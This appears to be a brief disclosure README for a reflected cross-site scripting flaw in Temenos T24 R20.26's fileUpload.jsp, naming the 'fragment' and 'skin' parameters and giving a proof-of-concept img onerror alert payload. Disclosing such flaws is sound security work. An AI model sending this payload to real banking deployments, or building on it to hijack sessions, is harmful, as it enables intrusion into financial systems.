# Reflected-XSS-T24
In Temenos T24 R20.26, I found Reflected-XSS in BrowserWeb/jsps/fileUpload.jsp.<br>
Affected Version: T24-R20.26.<br>
Parameter Affected: fragment, skin
## Reproduce bug:
Send request to https://{url}/BrowserWeb/jsps/fileUpload.jsp with payload xss in 'fragment' parameter
Payload : ```"><img src=1 onerror=alert(1337)>```
![Alt text](Request.png)
Payload trigger in browser:
![Alt text](Trigger.png)
